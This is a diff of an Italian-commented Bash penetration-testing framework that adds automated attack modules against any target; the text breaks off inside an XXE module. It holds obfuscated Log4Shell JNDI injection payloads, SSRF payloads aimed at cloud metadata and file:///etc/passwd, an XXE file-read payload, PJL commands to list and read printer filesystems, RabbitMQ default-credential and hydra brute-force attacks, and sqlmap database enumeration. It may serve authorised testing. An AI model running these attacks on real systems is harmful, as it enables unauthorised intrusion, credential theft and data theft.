@@ -9017,6 +9017,44 @@ cmd_auto() {
     _port_open 5683 && _run_mod "CoAP    :5683"  coap   "$target" && ran_enum=1
     # IPMI/BMC
     _port_open 623  && _run_mod "IPMI/BMC :623"  ipmi   "$target" && ran_enum=1
+    # Printer JetDirect/IPP/LPD
+    { _port_open 9100 || _port_open 631 || _port_open 515; } && \
+        _run_mod "Printer :9100/631" printer "$target" && ran_enum=1
+    # AMQP / RabbitMQ
+    { _port_open 5672 || _port_open 15672; } && \
+        _run_mod "AMQP/RabbitMQ :5672" amqp "$target" && ran_enum=1
+    # OPC-UA (Industrial)
+    _port_open 4840 && _run_mod "OPC-UA  :4840" opcua "$target" && ran_enum=1
+    # DNP3 (SCADA)
+    _port_open 20000 && _run_mod "DNP3  :20000" dnp3 "$target" && ran_enum=1
+    # Log4Shell su ogni porta HTTP trovata
+    { _port_open 80 || _port_open 8080 || _port_open 8443 || _port_open 443; } && {
+        local _l4s_port=80 _l4s_scheme=http
+        _port_open 443 && _l4s_port=443 && _l4s_scheme=https
+        _port_open 80  && _l4s_port=80  && _l4s_scheme=http
+        _run_mod "Log4Shell CVE-2021-44228" log4shell "$target" --port "$_l4s_port" --scheme "$_l4s_scheme"
+        ran_enum=1
+    }
+    # SQLi
+    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
+        _run_mod "SQLi (sqlmap)" sqli "$target" --port "$(
+            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
+        )" && ran_enum=1
+    # SSRF
+    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
+        _run_mod "SSRF" ssrf "$target" --port "$(
+            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
+        )" && ran_enum=1
+    # XXE
+    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
+        _run_mod "XXE" xxe "$target" --port "$(
+            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
+        )" && ran_enum=1
+    # JWT
+    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
+        _run_mod "JWT attack" jwt "$target" --port "$(
+            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
+        )" && ran_enum=1
     # DNS
     _port_open 53   && _run_mod "DNS      :53"   dns    "$target" && ran_enum=1
     # RTMP (DVR/NVR stream)
@@ -9354,9 +9392,9 @@ smb-system-info,smb2-security-mode \
 
     # ── Banner grab su porte non gestite da moduli specifici ──
     # Lista porte coperte dai moduli sopra — tutto il resto è "unknown"
-    local _known_ports=" 21 22 23 53 69 80 102 161 162 389 443 445 502 554 623 636 \
-                         1883 1900 1935 2427 2944 3389 3478 4443 5060 5061 5683 5900 \
-                         8000 8080 8200 8443 8554 20000 44818 47808 "
+    local _known_ports=" 21 22 23 53 69 80 102 161 162 389 443 445 502 515 554 623 631 636 \
+                         1883 1900 1935 2427 2944 3389 3478 4443 4840 5060 5061 5672 5683 5900 \
+                         8000 8080 8200 8443 8554 9100 15672 20000 44818 47808 "
     local _unknown_ports=""
     for _p in $open_tcp; do
         echo "$_known_ports" | grep -qw "$_p" || _unknown_ports="$_unknown_ports $_p"
@@ -11414,6 +11452,20 @@ except: pass
         else
             _atk "CVE Scanner cam/VoIP"           cam-cve "$target"
         fi
+    fi
+
+    # ── BLE scan (se adapter disponibile) ────────────────────────
+    if command -v hcitool &>/dev/null || command -v bluetoothctl &>/dev/null; then
+        log "  ▶ BLE scan (Bluetooth Low Energy)"
+        ran_attack=1
+        _atk "BLE scan" ble --output "$OUTDIR_BASE"
+    fi
+
+    # ── Metasploit check su porte aperte ──────────────────────────
+    if command -v msfconsole &>/dev/null; then
+        log "  ▶ Metasploit auxiliary check"
+        ran_attack=1
+        _atk "Metasploit check" msf "$target" --ports "$open_tcp" --output "$OUTDIR_BASE"
     fi
 
     [[ $ran_attack -eq 0 ]] && warn "Nessun vettore di attacco identificato dai findings"
@@ -14960,6 +15012,1193 @@ PYEOF
 }
 
 # ============================================================
+#  MODULO: printer — IPP / JetDirect / PJL
+# ============================================================
+usage_printer() {
+    echo "Uso: exa-dune printer TARGET [OPTIONS]"
+    echo ""
+    echo "  Audit stampanti di rete: PJL (porta 9100), IPP (631), LPD (515)."
+    echo "  Testa accesso non autenticato, dump filesystem, model/firmware info."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta JetDirect (default: 9100)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_printer() {
+    local target="" port=9100
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_printer; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_printer; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_printer; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "printer"
+    log "Target: $target | Output: $OUTDIR"
+
+    section "Printer — JetDirect PJL :$port"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if check_port "$target" "$port"; then
+            local _pjl_cmds=(
+                $'\x1b%-12345X@PJL\r\n@PJL INFO ID\r\n\x1b%-12345X'
+                $'\x1b%-12345X@PJL\r\n@PJL INFO STATUS\r\n\x1b%-12345X'
+                $'\x1b%-12345X@PJL\r\n@PJL INFO FILESYS\r\n\x1b%-12345X'
+                $'\x1b%-12345X@PJL\r\n@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=99\r\n\x1b%-12345X'
+            )
+            local _pjl_labels=("info_id" "status" "filesys" "fsdirlist")
+            local _i=0
+            for _cmd in "${_pjl_cmds[@]}"; do
+                local _label="${_pjl_labels[$_i]}"
+                local _out
+                _out=$(printf '%s' "$_cmd" | timeout 6 nc -w 5 "$target" "$port" 2>/dev/null || true)
+                echo "$_out" > "$OUTDIR/pjl_${_label}.txt"
+                if [[ -n "$_out" ]]; then
+                    if echo "$_out" | grep -qi "HP\|Lexmark\|Brother\|Canon\|Epson\|Xerox\|Konica\|OKI\|Ricoh\|Samsung\|@PJL\|READY\|ONLINE"; then
+                        found HIGH "Printer PJL:$port — risposta a PJL $_label"
+                        local _model; _model=$(echo "$_out" | grep -oiP '(?<=ID=)\S[^\r\n]+' | head -1 || true)
+                        [[ -n "$_model" ]] && found HIGH "Printer modello: $_model"
+                    fi
+                    if echo "$_out" | grep -qi '0:/\|1:/\|NAME='; then
+                        found CRITICAL "Printer PJL:$port — filesystem esposto via FSDIRLIST"
+                    fi
+                fi
+                ((_i++)) || true
+            done
+            # Tenta lettura /etc/passwd via PJL FSQUERY
+            local _pjl_read
+            _pjl_read=$(printf '\x1b%%-12345X@PJL\r\n@PJL FSQUERY NAME="0:/etc/passwd"\r\n\x1b%%-12345X' | \
+                timeout 6 nc -w 5 "$target" "$port" 2>/dev/null || true)
+            echo "$_pjl_read" > "$OUTDIR/pjl_fsquery_passwd.txt"
+            echo "$_pjl_read" | grep -qi "FILEERR\|FILESIZE\|root:" && \
+                found CRITICAL "Printer PJL:$port — lettura file system (FSQUERY)"
+        else
+            warn "Porta $port chiusa — JetDirect non raggiungibile"
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} PJL probe su $target:$port (INFO ID/STATUS/FILESYS/FSDIRLIST)"
+    fi
+
+    section "Printer — IPP :631"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if check_port "$target" 631; then
+            # IPP Get-Printer-Attributes via HTTP POST
+            local _ipp_payload
+            _ipp_payload=$(printf '\x01\x01\x00\x0b\x00\x00\x00\x01\x01\x47\x00\x12attributes-charset\x05utf-8\x48\x00\x1battributes-natural-language\x05en-us\x45\x00\x0bprinter-uri\x15ipp://localhost/ipp/\x03')
+            local _ipp_resp
+            _ipp_resp=$(printf '%s' "$_ipp_payload" | \
+                curl -s --max-time 8 -X POST \
+                    -H "Content-Type: application/ipp" \
+                    --data-binary @- \
+                    "http://$target:631/ipp" 2>/dev/null || true)
+            echo "$_ipp_resp" > "$OUTDIR/ipp_attrs.bin"
+            if [[ -n "$_ipp_resp" ]]; then
+                found MEDIUM "Printer IPP:631 — servizio attivo"
+                # Prova anche l'interfaccia web CUPS
+                local _cups
+                _cups=$(curl -s --max-time 5 "http://$target:631/" 2>/dev/null | grep -oiP '<title>[^<]+' | head -1 || true)
+                [[ -n "$_cups" ]] && found MEDIUM "Printer CUPS:631 — web UI: $_cups"
+            fi
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} IPP Get-Printer-Attributes su $target:631"
+    fi
+
+    section "Printer — LPD :515"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if check_port "$target" 515; then
+            local _lpd_resp
+            _lpd_resp=$(printf '\x01\n' | timeout 5 nc -w 4 "$target" 515 2>/dev/null | xxd | head -3 || true)
+            [[ -n "$_lpd_resp" ]] && found MEDIUM "Printer LPD:515 — servizio attivo (LPR/LPD)"
+            echo "$_lpd_resp" > "$OUTDIR/lpd_probe.txt"
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} LPD probe su $target:515"
+    fi
+
+    section "Printer — nmap NSE"
+    run_cmd "nmap_printer" \
+        "nmap -p $port,631,515 --script printer-info,pjl-ready-message,ipp-tags \
+         -oN \"$OUTDIR/nmap_printer.nmap\" $target 2>/dev/null"
+    [[ $DRY_RUN -eq 0 ]] && grep -qi "printer\|PJL\|model\|status" \
+        "$OUTDIR/nmap_printer.nmap" 2>/dev/null && \
+        found MEDIUM "Printer NSE — informazioni dispositivo rilevate"
+
+    ok "Printer audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: amqp — RabbitMQ / AMQP
+# ============================================================
+usage_amqp() {
+    echo "Uso: exa-dune amqp TARGET [OPTIONS]"
+    echo ""
+    echo "  Audit RabbitMQ/AMQP: test accesso anonimo, default creds,"
+    echo "  Management API (15672), vhost/queue/user enumeration."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta AMQP (default: 5672)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_amqp() {
+    local target="" port=5672
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_amqp; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_amqp; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_amqp; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "amqp"
+    log "Target: $target:$port | Output: $OUTDIR"
+
+    section "AMQP Banner Grab :$port"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if check_port "$target" "$port"; then
+            # AMQP handshake: invia "AMQP\x00\x00\x09\x01" (protocol header AMQP 0-9-1)
+            local _amqp_banner
+            _amqp_banner=$(printf 'AMQP\x00\x00\x09\x01' | timeout 6 nc -w 5 "$target" "$port" 2>/dev/null | strings | head -10 || true)
+            echo "$_amqp_banner" > "$OUTDIR/amqp_banner.txt"
+            if [[ -n "$_amqp_banner" ]]; then
+                found HIGH "AMQP:$port — servizio risponde (broker identificato)"
+                local _ver; _ver=$(echo "$_amqp_banner" | grep -oiP 'RabbitMQ\s[\d.]+|AMQP[\s\d.]+' | head -1 || true)
+                [[ -n "$_ver" ]] && found HIGH "AMQP:$port — versione: $_ver"
+            fi
+        else
+            warn "Porta $port chiusa — AMQP non raggiungibile"
+            ok "AMQP audit completato → $OUTDIR"; return
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} AMQP handshake probe su $target:$port"
+    fi
+
+    section "AMQP Management API :15672"
+    local _mgmt_ok=0
+    local _default_creds=("guest:guest" "admin:admin" "rabbitmq:rabbitmq" "admin:password" "user:user")
+    if [[ $DRY_RUN -eq 0 ]]; then
+        if check_port "$target" 15672; then
+            found MEDIUM "RabbitMQ Management UI:15672 — porta aperta"
+            for _cred in "${_default_creds[@]}"; do
+                local _u="${_cred%%:*}" _p="${_cred##*:}"
+                local _code
+                _code=$(curl -s -o /dev/null -w "%{http_code}" \
+                    --user "${_u}:${_p}" --max-time 5 \
+                    "http://$target:15672/api/overview" 2>/dev/null || echo "000")
+                if [[ "$_code" == "200" ]]; then
+                    found CRITICAL "RabbitMQ:15672 — accesso con ${_u}:${_p}"
+                    _mgmt_ok=1
+                    # Dump overview, vhosts, queues, users
+                    for _api_ep in "overview" "vhosts" "queues" "users" "connections" "exchanges"; do
+                        curl -s --user "${_u}:${_p}" --max-time 8 \
+                            "http://$target:15672/api/$_api_ep" 2>/dev/null | \
+                            python3 -c "import json,sys; d=json.load(sys.stdin); print(json.dumps(d,indent=2))" \
+                            2>/dev/null > "$OUTDIR/mgmt_${_api_ep}.json" || true
+                    done
+                    break
+                fi
+            done
+            if [[ $_mgmt_ok -eq 0 ]]; then
+                # Prova brute force hydra sulla management UI
+                if tool_ok hydra; then
+                    local _ul; _ul=$(_wl_users)
+                    local _pl; _pl=$(_wl_pass)
+                    run_cmd "hydra_amqp" \
+                        "hydra -L \"$_ul\" -P \"$_pl\" -s 15672 -t 4 -f \
+                         -o \"$OUTDIR/hydra_amqp_mgmt.txt\" $target http-get /api/overview 2>&1"
+                    grep -i "login:" "$OUTDIR/hydra_amqp_mgmt.txt" 2>/dev/null | \
+                        while IFS= read -r _l; do found HIGH "RabbitMQ:15672 brute-force — $_l"; done || true
+                fi
+            fi
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} RabbitMQ Management API probe $target:15672 (default creds + hydra)"
+    fi
+
+    section "AMQP Erlang Port Mapper :25672"
+    if [[ $DRY_RUN -eq 0 ]] && check_port "$target" 25672; then
+        local _erl_banner
+        _erl_banner=$(timeout 5 nc -w 4 "$target" 25672 </dev/null 2>/dev/null | strings | head -5 || true)
+        echo "$_erl_banner" > "$OUTDIR/erlang_banner.txt"
+        [[ -n "$_erl_banner" ]] && found HIGH "RabbitMQ Erlang dist:25672 — porta esposta (clustering attack possibile)"
+    fi
+
+    ok "AMQP audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: log4shell — CVE-2021-44228 Detection
+# ============================================================
+usage_log4shell() {
+    echo "Uso: exa-dune log4shell TARGET [OPTIONS]"
+    echo ""
+    echo "  Rileva CVE-2021-44228 (Log4Shell) su target HTTP/HTTPS."
+    echo "  Inietta payloads JNDI in header e parametri, avvia listener locale"
+    echo "  per rilevare callback DNS/LDAP."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta HTTP target (default: 80)"
+    echo "  --scheme SCHEME  http|https (default: http)"
+    echo "  --lport PORT     Porta listener locale (default: 1389)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_log4shell() {
+    local target="" port=80 scheme="http" lport=1389
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
+            --lport)   _req_arg "$1" "${2:-}"; lport="$2";       shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_log4shell; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_log4shell; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_log4shell; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "log4shell"
+    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"
+
+    local base_url="${scheme}://${target}:${port}"
+    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
+
+    # Payload JNDI in varianti obfuscate
+    local -a _payloads=(
+        "\${jndi:ldap://127.0.0.1:${lport}/a}"
+        "\${jndi:ldap://127.0.0.1:${lport}/exa}"
+        "\${jndi:rmi://127.0.0.1:${lport}/a}"
+        "\${jndi:dns://127.0.0.1:${lport}/a}"
+        "\${\${lower:j}ndi:\${lower:l}dap://127.0.0.1:${lport}/a}"
+        "\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://127.0.0.1:${lport}/a}"
+        "\${\${upper:j}ndi:\${upper:l}dap://127.0.0.1:${lport}/a}"
+        "\${\${env:NaN:-j}ndi:\${env:NaN:-l}dap://127.0.0.1:${lport}/a}"
+    )
+
+    section "Log4Shell — Avvio listener locale :$lport"
+    local _cb_file="$OUTDIR/callback.txt"
+    local _listener_pid=""
+    if [[ $DRY_RUN -eq 0 ]]; then
+        rm -f "$_cb_file"
+        nc -l -p "$lport" > "$_cb_file" 2>/dev/null &
+        _listener_pid=$!
+        log "Listener LDAP/TCP su :$lport (PID $_listener_pid)"
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} nc -l -p $lport (listener callback)"
+    fi
+
+    section "Log4Shell — Injection header HTTP"
+    local -a _headers=("User-Agent" "X-Forwarded-For" "X-Api-Version" "Referer" "X-Client-IP"
+                       "Authorization" "Accept-Language" "X-Originating-IP" "CF-Connecting-IP"
+                       "X-Real-IP" "Forwarded")
+    local _found_cb=0
+    if [[ $DRY_RUN -eq 0 ]]; then
+        for _payload in "${_payloads[@]:0:3}"; do
+            for _hdr in "${_headers[@]}"; do
+                curl -s $insecure --max-time 5 \
+                    -H "${_hdr}: ${_payload}" \
+                    "${base_url}/" > /dev/null 2>&1 || true
+            done
+            # Parametri GET comuni
+            for _param in "q" "search" "user" "id" "name" "value" "input" "data" "cmd"; do
+                curl -s $insecure --max-time 5 \
+                    "${base_url}/?${_param}=${_payload}" > /dev/null 2>&1 || true
+            done
+        done
+        echo "Payload inviati: ${#_payloads[@]} varianti x ${#_headers[@]} headers" \
+            >> "$OUTDIR/log4shell_probe.txt"
+        # Attendi callback (max 5s)
+        sleep 5
+        if [[ -s "$_cb_file" ]]; then
+            found CRITICAL "Log4Shell CVE-2021-44228 — CALLBACK RICEVUTO su :$lport!"
+            cp "$_cb_file" "$OUTDIR/callback_data.txt"
+            _found_cb=1
+        else
+            log "Nessun callback ricevuto — target probabilmente non vulnerabile o payload filtrato"
+        fi
+        # Cleanup listener
+        [[ -n "$_listener_pid" ]] && kill "$_listener_pid" 2>/dev/null || true
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} Log4Shell probe: ${#_payloads[@]} payload x ${#_headers[@]} headers + GET params"
+    fi
+
+    # Controlla anche se il payload appare non filtrato nel response (reflected)
+    section "Log4Shell — Reflected detection"
+    if [[ $DRY_RUN -eq 0 && $_found_cb -eq 0 ]]; then
+        local _probe="\${jndi:ldap://log4shell-probe/test}"
+        local _resp
+        _resp=$(curl -s $insecure --max-time 8 \
+            -H "User-Agent: ${_probe}" \
+            "${base_url}/" 2>/dev/null | head -50 || true)
+        echo "$_resp" > "$OUTDIR/reflected_probe.txt"
+        if echo "$_resp" | grep -qi "jndi\|log4j\|ldap://"; then
+            found HIGH "Log4Shell — payload riflesso nella risposta (possibile vulnerabilità)"
+        fi
+    fi
+
+    ok "Log4Shell audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: sqli — SQL Injection (sqlmap integration)
+# ============================================================
+usage_sqli() {
+    echo "Uso: exa-dune sqli TARGET [OPTIONS]"
+    echo ""
+    echo "  SQL Injection automatico con sqlmap su endpoint HTTP rilevati."
+    echo "  Legge URL da web/gobuster.txt se disponibile, altrimenti testa root."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta HTTP (default: 80)"
+    echo "  --scheme SCHEME  http|https (default: http)"
+    echo "  --url URL        URL specifico da testare"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_sqli() {
+    local target="" port=80 scheme="http" custom_url=""
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
+            --url)     _req_arg "$1" "${2:-}"; custom_url="$2";  shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_sqli; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_sqli; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_sqli; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "sqli"
+    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"
+
+    if ! tool_ok sqlmap; then
+        warn "sqlmap non trovato — installa: apt install sqlmap"
+        ok "SQLi audit saltato"; return
+    fi
+
+    local base_url="${scheme}://${target}:${port}"
+    local _sqlmap_opts="--batch --level=2 --risk=2 --timeout=30 --output-dir=\"$OUTDIR\""
+    [[ $STEALTH -eq 1 ]] && _sqlmap_opts="$_sqlmap_opts --delay=2 --safe-freq=5"
+    local insecure=""; [[ "$scheme" == "https" ]] && insecure="--ignore-ssl-errors"
+
+    # Raccoglie URL da testare
+    local -a _urls=()
+    if [[ -n "$custom_url" ]]; then
+        _urls+=("$custom_url")
+    else
+        _urls+=("${base_url}/?id=1" "${base_url}/?q=test" "${base_url}/?search=a")
+        # Leggi URL da gobuster se disponibile
+        local _gob_file
+        _gob_file=$(find "$OUTDIR_BASE" -name "gobuster*.txt" 2>/dev/null | head -1 || true)
+        if [[ -n "$_gob_file" ]]; then
+            while IFS= read -r _line; do
+                local _path; _path=$(echo "$_line" | grep -oP '^/\S+' | head -1 || true)
+                [[ -n "$_path" ]] && _urls+=("${base_url}${_path}?id=1")
+            done < "$_gob_file"
+        fi
+    fi
+
+    section "SQLi — sqlmap su ${#_urls[@]} URL"
+    local _sqli_found=0
+    for _url in "${_urls[@]:0:10}"; do
+        log "  Test SQLi: $_url"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            # shellcheck disable=SC2086
+            local _sm_out
+            _sm_out=$(timeout 120 sqlmap -u "$_url" $insecure $DEBUG_OPTS \
+                --batch --level=2 --risk=2 --timeout=20 \
+                --output-dir="$OUTDIR/sqlmap" 2>&1 | tail -20 || true)
+            echo "=== $_url ===" >> "$OUTDIR/sqlmap_summary.txt"
+            echo "$_sm_out"     >> "$OUTDIR/sqlmap_summary.txt"
+            if echo "$_sm_out" | grep -qi "is vulnerable\|sql injection\|parameter.*injectable\|sqlmap identified"; then
+                found CRITICAL "SQLi confermata — URL: $_url"
+                _sqli_found=1
+                # Enumera DB
+                timeout 120 sqlmap -u "$_url" $insecure \
+                    --batch --dbs --output-dir="$OUTDIR/sqlmap" 2>&1 \
+                    >> "$OUTDIR/sqlmap_dbs.txt" || true
+                grep -qi "available databases" "$OUTDIR/sqlmap_dbs.txt" 2>/dev/null && \
+                    found CRITICAL "SQLi — database enumeration riuscita: $(grep -oP '\[\*\] \K\S+' "$OUTDIR/sqlmap_dbs.txt" 2>/dev/null | head -5 | tr '\n' ' ' || true)"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} sqlmap -u $_url --batch --level=2 --risk=2"
+        fi
+    done
+    [[ $_sqli_found -eq 0 && $DRY_RUN -eq 0 ]] && log "Nessuna SQL injection rilevata"
+
+    ok "SQLi audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: ssrf — Server-Side Request Forgery
+# ============================================================
+usage_ssrf() {
+    echo "Uso: exa-dune ssrf TARGET [OPTIONS]"
+    echo ""
+    echo "  Rileva SSRF su parametri URL comuni (url=, dest=, redirect=, proxy=, ...)."
+    echo "  Testa accesso a localhost, cloud metadata (169.254.169.254), file:///etc/passwd."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta HTTP (default: 80)"
+    echo "  --scheme SCHEME  http|https (default: http)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_ssrf() {
+    local target="" port=80 scheme="http"
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_ssrf; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_ssrf; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_ssrf; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "ssrf"
+    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"
+
+    local base_url="${scheme}://${target}:${port}"
+    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
+
+    local -a _params=("url" "dest" "redirect" "uri" "path" "src" "href" "proxy"
+                      "callback" "next" "return" "returnTo" "continue" "target"
+                      "site" "img" "image" "ref" "fetch" "load" "open" "to"
+                      "file" "page" "view" "navigate" "forward" "go")
+    local -a _ssrf_payloads=(
+        "http://127.0.0.1/"
+        "http://localhost/"
+        "http://0.0.0.0/"
+        "http://169.254.169.254/latest/meta-data/"
+        "http://[::1]/"
+        "http://2130706433/"
+        "http://0177.0.0.1/"
+        "file:///etc/passwd"
+        "dict://127.0.0.1:6379/info"
+        "gopher://127.0.0.1:25/_HELO%20ssrf"
+    )
+
+    section "SSRF — Probe su parametri comuni"
+    local _ssrf_found=0
+    if [[ $DRY_RUN -eq 0 ]]; then
+        for _param in "${_params[@]:0:15}"; do
+            for _ssrf_pl in "${_ssrf_payloads[@]:0:5}"; do
+                local _resp _enc_pl
+                _enc_pl=$(printf '%s' "$_ssrf_pl" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || printf '%s' "$_ssrf_pl")
+                _resp=$(curl -s $insecure --max-time 8 \
+                    "${base_url}/?${_param}=${_enc_pl}" 2>/dev/null | head -50 || true)
+                echo "=== ${_param}=${_ssrf_pl} ===" >> "$OUTDIR/ssrf_probe.txt"
+                echo "$_resp" | head -10             >> "$OUTDIR/ssrf_probe.txt"
+                if echo "$_resp" | grep -qiE "ami-|instance-id|meta-data|root:|localhost|127\.0\.0\.1|redis_version|\+OK"; then
+                    found CRITICAL "SSRF confermato — parametro '${_param}' con payload: ${_ssrf_pl}"
+                    echo "SSRF: param=${_param} payload=${_ssrf_pl}" >> "$OUTDIR/ssrf_confirmed.txt"
+                    echo "$_resp" >> "$OUTDIR/ssrf_confirmed.txt"
+                    _ssrf_found=1
+                fi
+            done
+        done
+        [[ $_ssrf_found -eq 0 ]] && log "SSRF: nessuna vulnerabilità rilevata sui parametri testati"
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} SSRF probe: ${#_params[@]} parametri x ${#_ssrf_payloads[@]} payload su $base_url"
+    fi
+
+    section "SSRF — POST body injection"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        for _param in "url" "dest" "redirect" "proxy" "callback"; do
+            local _resp
+            _resp=$(curl -s $insecure --max-time 8 -X POST \
+                -d "${_param}=http://127.0.0.1/" \
+                "${base_url}/" 2>/dev/null | head -20 || true)
+            if echo "$_resp" | grep -qiE "root:|localhost|127\.0\.0\.1|Connection refused|ECONNREFUSED"; then
+                found HIGH "SSRF via POST — parametro '${_param}' riflette risposta interna"
+                _ssrf_found=1
+            fi
+        done
+    fi
+
+    ok "SSRF audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  MODULO: xxe — XML External Entity Injection
+# ============================================================
+usage_xxe() {
+    echo "Uso: exa-dune xxe TARGET [OPTIONS]"
+    echo ""
+    echo "  Rileva XXE su endpoint XML/SOAP. Testa lettura file locali,"
+    echo "  entità esterne, OOB blind XXE."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta HTTP (default: 80)"
+    echo "  --scheme SCHEME  http|https (default: http)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_xxe() {
+    local target="" port=80 scheme="http"
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
+            --dry-run) DRY_RUN=1;              shift ;;
+            --stealth) STEALTH=1;              shift ;;
+            --help|-h) usage_xxe; exit 0 ;;
+            -*)        err "Opzione sconosciuta: $1"; usage_xxe; exit 1 ;;
+            *)         target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_xxe; exit 1; }
+    validate_target "$target"
+    check_root
+    setup_outdir "$target" "xxe"
+    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"
+
+    local base_url="${scheme}://${target}:${port}"
+    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
+
+    # Payload XXE base (lettura /etc/passwd)
+    local _xxe_basic='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
